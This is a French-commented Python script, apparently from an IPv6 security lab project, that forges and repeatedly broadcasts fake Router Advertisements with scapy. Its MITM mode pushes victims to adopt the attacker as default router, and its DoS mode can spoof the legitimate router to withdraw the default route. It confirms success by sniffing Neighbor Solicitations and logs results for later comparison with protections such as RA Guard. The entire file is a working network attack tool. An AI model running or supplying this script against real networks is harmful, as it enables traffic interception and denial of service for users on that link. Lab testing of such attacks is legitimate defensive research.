#!/usr/bin/env python3
"""
Attaque —> Faux Router Advertisement (fake_ra.py)

Critère de réussite (CONTRAT.md §6) :
    "Faux RA : une victime a une route par défaut vers l'attaquant"
    (vérifiable avec `ip -6 route show default` CÔTÉ VICTIME).

Ce script ne peut PAS lire la table de routage de la victime (il tourne
dans le conteneur attacker). Comme pour na_spoof.py, on détecte le succès
INDIRECTEMENT : si la victime a adopté notre adresse comme routeur par
défaut, elle va vouloir connaître notre adresse MAC pour nous envoyer du
trafic -> elle émet un Neighbor Solicitation (NS) demandant "qui a
l'adresse <notre src_ip> ?". On guette ce NS précis pour confirmer.

Deux modes (cf. planning) :
  - mitm : RA normal (lifetime=1800s) mais préférence "haute" (prf=high,
           RFC 4191), envoyé plus souvent que le routeur légitime
           (radvd.conf : MinRtrAdvInterval=3, MaxRtrAdvInterval=10).
           But : la victime ajoute (ou préfère) notre adresse comme
           routeur par défaut -> MITM possible ensuite.
  - dos   : RA avec routerlifetime=0 ("je ne suis plus un routeur,
           arrête de m'utiliser"). Pour un effet réel il faut le faire
           depuis l'adresse déjà connue de la victime : --src permet de
           passer fe80::1 (usurpation du routeur légitime) pour ce mode.
           Par défaut --src reste fe80::2 (notre propre adresse, comme
           dans les diagrammes du rapport) : dans ce cas le "dos" ne
           fait que proposer un routeur inutile, l'effet réel nécessite
           --src fe80::1 (usurpation complète), à n'utiliser qu'en
           connaissance de cause et seulement dans le lab.

Étapes de l'attaque dans l'ordre (cf. planning) :
  1. (manuel, tshark) observer un RA légitime pour connaître le format exact
       -> fait : voir lab/configs/router/radvd.conf, repris ci-dessous
  2. construire un RA factice, source fe80::2, préfixe attendu     -> _construire_ra
  3. choisir le mode (mitm / dos)                                  -> --mode
  4. envoyer en boucle, intervalle plus court que le routeur légitime -> _marteler_ra
  5. vérifier côté victime le changement de route par défaut        -> _ecouter_ns (indirect) + vérif manuelle
  6. variantes de contournement (en-têtes d'extension, fragmentation) -> une fois la protection (RA Guard) posée, PAS MAINTENANT
  7. noter les résultats dans le CSV commun                          -> log_resultat

Usage dans le conteneur attacker (root requis pour les sockets bruts) :

  # Mode MITM : préférence haute, toutes les 1s (le vrai routeur est entre 3 et 10s)
  sudo python3 fake_ra.py --iface eth1 --phase avant --essai 1 \
      --mode mitm --duree 30

  # Mode DoS, en usurpant carrément l'adresse du vrai routeur (fe80::1)
  sudo python3 fake_ra.py --iface eth1 --phase avant --essai 1 \
      --mode dos --src fe80::1 --duree 15

  # Test hors lab, sans rien envoyer :
  python3 fake_ra.py --iface lo --phase avant --essai 1 --mode mitm --duree 5 --dry-run

Vérification manuelle côté victime (OBLIGATOIRE, ce script ne le voit pas) :
  docker exec clab-ipv6lab-victim1 ip -6 route show default
Restauration après le test (attendre l'expiration du faux RA, ou :) :
  docker exec clab-ipv6lab-victim1 ip -6 route flush cache
"""

import signal
import sys
import threading
import time

from common import base_arg_parser, log_resultat, mesurer_latence_ping

try:
    from scapy.all import (
        Ether, IPv6, ICMPv6ND_RA, ICMPv6ND_NS,
        ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr,
        get_if_hwaddr, sendp, sniff,
    )
except ImportError:
    sys.exit("[ERREUR] scapy n'est pas installé dans ce conteneur : pip install scapy")

# MAC multicast Ethernet correspondant à ff02::1 (tous les nœuds du lien),
# cf. RFC 2464 : les 4 derniers octets du groupe multicast IPv6 préfixés
# par 33:33. Le vrai routeur (radvd) envoie ses RA à cette même adresse.
MAC_MULTICAST_TOUS_NOEUDS = "33:33:00:00:00:01"

# Table de préférence RFC 4191 (champ "prf" du RA, 2 bits)
PRF_VALEURS = {"high": 1, "medium": 0, "low": 3}


class AttaqueFakeRA:
    """Regroupe l'état de l'attaque (compteurs, flag d'arrêt) pour éviter
    les variables globales partagées entre le thread d'envoi et le thread
    d'écoute, comme dans na_spoof.py.
    """

    def __init__(self, iface, src_ip, prefix, prefix_len, mode,
                 intervalle, lifetime, prf, dry_run):
        self.iface = iface
        self.src_ip = src_ip              # fe80::2 par défaut (cf. diagrammes du rapport)
        self.prefix = prefix              # 2001:db8:10:10:: par défaut (CONTRAT.md §3)
        self.prefix_len = prefix_len      # 64
        self.mode = mode                  # "mitm" ou "dos"
        self.intervalle = intervalle      # secondes entre deux RA factices
        self.lifetime = lifetime          # ignoré en mode dos (forcé à 0)
        self.prf = prf                    # "high" / "medium" / "low"
        self.dry_run = dry_run
        self.mac_attaquant = get_if_hwaddr(iface)
        self.arret = threading.Event()
        self.ra_envoyes = 0
        self.ns_vers_nous = 0           # nb de NS où une victime cherche notre adresse
        self.adoption_confirmee = False  # au moins une victime nous a adoptés

    # ---------- construction du paquet falsifié ----------

    def _construire_ra(self):
        """RA calqué sur radvd.conf (lab/configs/router/radvd.conf) :
        même préfixe, M=1 (adresse gérée par DHCPv6), O=1 (autres options
        par DHCPv6), AdvOnLink/AdvAutonomous -> L=1/A=1 sur le préfixe.
        Seuls changent : la source (nous), le routerlifetime (0 en dos),
        et la préférence prf (haute, en mitm, pour gagner face au vrai
        routeur selon RFC 4191).
        """
        eth = Ether(src=self.mac_attaquant, dst=MAC_MULTICAST_TOUS_NOEUDS)
        ip6 = IPv6(src=self.src_ip, dst="ff02::1")

        routerlifetime = 0 if self.mode == "dos" else self.lifetime
        ra = ICMPv6ND_RA(
            chlim=64,
            M=1, O=1,
            prf=PRF_VALEURS[self.prf],
            routerlifetime=routerlifetime,
            reachabletime=0,
            retranstimer=0,
        )
        opt_prefixe = ICMPv6NDOptPrefixInfo(
            prefixlen=self.prefix_len,
            L=1, A=1,
            validlifetime=86400,
            preferredlifetime=14400,
            prefix=self.prefix,
        )
        opt_src_ll = ICMPv6NDOptSrcLLAddr(lladdr=self.mac_attaquant)
        return eth / ip6 / ra / opt_prefixe / opt_src_ll

    def _envoyer_ra(self):
        pkt = self._construire_ra()
        if self.dry_run:
            print(f"[DRY-RUN] RA factice (mode={self.mode}, prf={self.prf}, "
                  f"src={self.src_ip}) qui serait envoyé sur {self.iface}")
        else:
            sendp(pkt, iface=self.iface, verbose=False)
        self.ra_envoyes += 1

    def _marteler_ra(self):
        """Thread 1 : ré-émet le faux RA en boucle, plus souvent que le
        vrai routeur (MinRtrAdvInterval=3s), pour rester "frais" dans la
        liste des routeurs par défaut de la victime.
        """
        while not self.arret.is_set():
            self._envoyer_ra()
            self.arret.wait(self.intervalle)

    # ---------- détecter l'adoption (indirect, via NS) ----------

    def _callback_ns(self, pkt):
        """Si une victime nous a adoptés comme routeur par défaut, elle a
        besoin de notre MAC pour nous envoyer du trafic -> elle émet un NS
        demandant "qui a self.src_ip ?". Recevoir ce NS est la preuve
        indirecte que l'attaque a marché (même principe que
        na_spoof.py::_callback_detournement, mais ici on observe la
        *demande* plutôt que le trafic détourné lui-même).
        """
        if ICMPv6ND_NS not in pkt or IPv6 not in pkt:
            return
        if pkt[ICMPv6ND_NS].tgt != self.src_ip:
            return
        self.ns_vers_nous += 1
        victime_ip = pkt[IPv6].src
        if not self.adoption_confirmee:
            self.adoption_confirmee = True
            print(f"[OK] {victime_ip} nous cherche en tant que routeur "
                  f"({self.src_ip}) -> adoption confirmée")

    def _ecouter_ns(self):
        """Thread 2 : guette les NS demandant notre adresse."""
        filtre_bpf = "icmp6 and ip6[40] == 135"  # 135 = Neighbor Solicitation
        sniff(
            iface=self.iface, filter=filtre_bpf,
            prn=self._callback_ns,
            stop_filter=lambda p: self.arret.is_set(),
            store=False,
        )

    # ---------- orchestration ----------

    def executer(self, duree_s):
        threads = [
            threading.Thread(target=self._marteler_ra, daemon=True),
            threading.Thread(target=self._ecouter_ns, daemon=True),
        ]
        for t in threads:
            t.start()
        print(f"[*] Faux RA en cours sur {self.iface} "
              f"(mode={self.mode}, src={self.src_ip}, prf={self.prf}, "
              f"intervalle={self.intervalle}s) pendant {duree_s:.0f}s...")
        print("    Ctrl+C pour arrêter proprement avant la fin.")

        def gerer_signal(signum, frame):
            print("\n[!] Arrêt demandé, fin propre de l'attaque...")
            self.arret.set()

        signal.signal(signal.SIGINT, gerer_signal)
        signal.signal(signal.SIGTERM, gerer_signal)

        fin = time.time() + duree_s
        while time.time() < fin and not self.arret.is_set():
            time.sleep(0.5)
        self.arret.set()
        time.sleep(1)  # laisser les threads sniff se terminer


def main():
    parser = base_arg_parser(
        "Faux Router Advertisement IPv6 (fake_ra), mode MITM (préférence haute) "
        "ou DoS (routerlifetime=0)"
    )
    parser.add_argument("--mode", choices=["mitm", "dos"], default="mitm",
                         help="'mitm' : RA normal + préférence haute. "
                              "'dos' : routerlifetime=0 (coupe la route).")
    parser.add_argument("--src", default="fe80::2",
                         help="Adresse source (link-local) du faux RA. "
                              "fe80::2 = notre propre adresse (par défaut, "
                              "cf. diagrammes du rapport). Pour un vrai effet "
                              "DoS, passer fe80::1 (usurpation du routeur "
                              "légitime) -- UNIQUEMENT dans le lab.")
    parser.add_argument("--prefix", default="2001:db8:10:10::",
                         help="Préfixe annoncé (CONTRAT.md §3).")
    parser.add_argument("--prefix-len", type=int, default=64)
    parser.add_argument("--intervalle", type=float, default=1.0,
                         help="Secondes entre deux faux RA (le vrai routeur "
                              "est entre 3s et 10s, cf. radvd.conf).")
    parser.add_argument("--lifetime", type=int, default=1800,
                         help="routerlifetime annoncé en mode mitm (ignoré en mode dos, forcé à 0).")
    parser.add_argument("--prf", choices=["high", "medium", "low"], default="high",
                         help="Préférence RFC 4191 (mode mitm : 'high' pour "
                              "gagner face au vrai routeur, qui est 'medium' par défaut).")
    args = parser.parse_args()

    attaque = AttaqueFakeRA(
        iface=args.iface,
        src_ip=args.src,
        prefix=args.prefix,
        prefix_len=args.prefix_len,
        mode=args.mode,
        intervalle=args.intervalle,
        lifetime=args.lifetime,
        prf=args.prf,
        dry_run=args.dry_run,
    )

    # Latence vers une cible fixe du VLAN (le serveur dhcp, à travers le routeur) :
    # sert à voir si le trafic est perturbé pendant l'attaque (utile surtout en mode dos).
    cible_latence = "2001:db8:10:20::10"
    latence_avant = None if args.dry_run else mesurer_latence_ping(cible_latence, args.iface, count=2)

    attaque.executer(args.duree)

    latence_apres = None if args.dry_run else mesurer_latence_ping(cible_latence, args.iface, count=2)
    latence_ms = latence_apres if latence_apres is not None else latence_avant

    # succes : en mode mitm, confirmé automatiquement si on a vu un NS.
    # en mode dos, ce script ne peut pas voir une route DISPARAITRE (il n'y
    # a rien à sniffer pour ça) : la vérification doit être manuelle
    # (docker exec clab-ipv6lab-victim1 ip -6 route show default).
    if args.mode == "mitm":
        succes = attaque.adoption_confirmee or args.dry_run
    else:
        succes = args.dry_run
        print("[RAPPEL] Mode dos : vérifie manuellement côté victime avec :")
        print("  docker exec clab-ipv6lab-victim1 ip -6 route show default")
        print("  (si la route par défaut a disparu ou pointe ailleurs, modifie "
              "la ligne CSV à la main, colonne 'succes')")

    commentaire = (
        f"mode={args.mode}, src={args.src}, prf={args.prf}, "
        f"ra_envoyes={attaque.ra_envoyes}, ns_vers_nous={attaque.ns_vers_nous}. "
        f"{args.commentaire}".strip()
    )

    log_resultat(
        attaque="fake_ra",
        phase=args.phase,
        essai=args.essai,
        succes=succes,
        cache_voisins=None,  # non pertinent pour cette attaque
        latence_ms=latence_ms,
        faux_positif=False,
        commentaire=commentaire,
    )

    print(f"\n[FIN] ra_envoyes={attaque.ra_envoyes} ns_vers_nous={attaque.ns_vers_nous} "
          f"succes={succes}")


if __name__ == "__main__":
    main()
